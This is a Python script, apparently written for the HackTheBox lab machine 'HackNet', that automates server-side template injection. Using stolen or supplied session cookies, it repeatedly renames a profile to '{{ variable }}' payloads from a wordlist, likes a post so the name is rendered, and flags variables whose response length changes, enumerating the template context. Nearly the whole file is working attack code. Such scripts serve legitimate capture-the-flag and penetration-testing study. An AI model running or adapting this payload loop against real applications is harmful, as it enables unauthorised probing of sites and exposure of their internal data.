#!/usr/bin/python3
import sys
import requests
import argparse
from bs4 import BeautifulSoup


def parse_arguments()->argparse.Namespace:
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description="Update profile name in HTB HackNet Machine.",
                                     epilog=f"""
Example usage:
python3 {sys.argv[0]} -n 'test' --csrftoken 'gcb1jgkc9JBOH5ZbZE9Ajxkf7M1oly3k' --session 'qz3kztdxme2zhaybb0d4zynuxd66pa0s'""",
                                     formatter_class=argparse.RawTextHelpFormatter)

    # Add arguments with flags
    parser.add_argument("--csrftoken", type=str, help="'csrftoken' variable value from session", required=True)
    parser.add_argument("--sessionid", type=str, help="'sessionid' variable value from session", required=True)
    parser.add_argument("--default-username", type=str, default="gunzf0x", help="Default username to test the application")
    parser.add_argument('--variable-dictionary', type=str, default="jingla_context_possible_variables.txt",
                         help="Path to dictionary file containing variables to try.")

    return parser.parse_args()

def cookie_object(csrftoken_value, sessionid_value):
    profile_cookies = {
        "csrftoken": csrftoken_value,
        "sessionid": sessionid_value,
    }
    return profile_cookies


def get_csrfmiddlewartetoken_variable(profile_cookies)->str:
    profile_url: str = "http://hacknet.htb/profile/edit"
    r = requests.get(profile_url, cookies=profile_cookies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
    csrf_token = token_input["value"]
    return csrf_token


def give_like_to_post(username: str, profile_cookies, wantToUpdateProf:bool=True):
    # Update our profile name to our default username
    if wantToUpdateProf:
        update_profile(username, profile_cookies)
    # Give a like to the post
    liked_post_url = "http://hacknet.htb/like/10"
    req_give_like = requests.get(liked_post_url, cookies=profile_cookies)
    if req_give_like.status_code != 200:
        print(f"[-] Something went wrong when giving a like to the post as {username!r} user. Status code: {req_give_like.status_code}")
        sys.exit(1)
    


def is_post_liked(default_username: str, profile_cookies)->bool:
    # Update our username and give a like to a post using default username
    give_like_to_post(default_username, profile_cookies)
    # Retrieve likes from post. If our name is there, it means the post is now in "liked" status by our user.
    # Else, it was already liked and we just removed our like (it is in "not liked" current status).
    likes_post_url = "http://hacknet.htb/likes/10"
    req_check_like = requests.get(likes_post_url, cookies=profile_cookies)
    if default_username in req_check_like.text:
        return True
    return False


def check_liked_post(profile_cookies, var)->bool:
    likes_post_url = "http://hacknet.htb/likes/10"
    isPeculiar: bool = False
    req_check_post = requests.get(likes_post_url, cookies=profile_cookies)
    if len(req_check_post.content) != 1061:
        print(f"[+] Variable {var!r} has a peculiar length ({len(req_check_post.content)}).")
        isPeculiar = True
    return isPeculiar


def update_profile(new_username: str, profile_cookies)->None:
    profile_url: str = "http://hacknet.htb/profile/edit"
    # Profile data to update.
    form_data = {
        "csrfmiddlewaretoken": get_csrfmiddlewartetoken_variable(profile_cookies),
        "email": "",
        "username": new_username,
        "password": "",
        "about": "",
        "is_public": "on",
    }

    files = {
    # Send an empty file field (no content). requests will handle multipart.
        "picture": ("", b""),
    }
    response = requests.post(
        profile_url,
        cookies=profile_cookies,
        data=form_data,
        files=files,
        timeout=10,
    )

    # Check that code status is 200 OK and the cookies provided are valid
    if response.status_code != 200 or "/login" in response.text:
        if response.status_code == 200:
            print(f"[-] Code status is {response.status_code}, but could not update profile. It seems that cookies provided are not valid.")
            sys.exit(1)
        print(f"[-] Wrong code status: {response.status_code}")
        sys.exit(1)
    print(f"[+] Profile successfully updated for new username {new_username!r}")


def create_list_of_variables(dictionary_path: str):
    try:
        with open(dictionary_path, "r") as f:
            lines = f.read().splitlines() 
    except Exception as e:
        print(f"[-] An error ocurred: {e}")
        sys.exit(1)
    return lines


def main()->None:
    # Get arguments from user
    args: argparse.Namespace = parse_arguments()
    # Build a dictionary that will store cookies
    profile_cookies = cookie_object(args.csrftoken, args.sessionid)
    
    print(f"[+] Starting bruteforce. Using {args.variable_dictionary!r} dictionary for variables...")
    list_of_variables = create_list_of_variables(args.variable_dictionary)
    length_var_list: int = len(list_of_variables)
    interesting_words = []
    for counter, var in enumerate(list_of_variables):
        print(60*"=")
        print(f"\n[*] Attempting with {var!r} variable... ({counter+1}/{length_var_list})")
        # Check if post is already liked or not (to reflect our username payload and trigger SSTI)
        if is_post_liked(args.default_username, profile_cookies):
            print("[+] Post is in 'liked' list. Giving it 'like' again to change it's 'liked' status...")
            give_like_to_post(args.default_username, profile_cookies, wantToUpdateProf=False)
        # Else, the post is was already liked and with our previous "liked" post, now it is not on "liked" status
        update_profile('{{ '+ var +' }}', profile_cookies)
        # Give like to post with our new username
        give_like_to_post('{{ '+ var +' }}', profile_cookies, wantToUpdateProf=False)
        # And check liked post
        isVarPeculiar = check_liked_post(profile_cookies, var)
        if isVarPeculiar:
            interesting_words.append(var)
    print(60*"=")
    print(f"\n\n[+] Interesting words list retrieved:\n{interesting_words}")
    


if __name__ == "__main__":
    main()
    


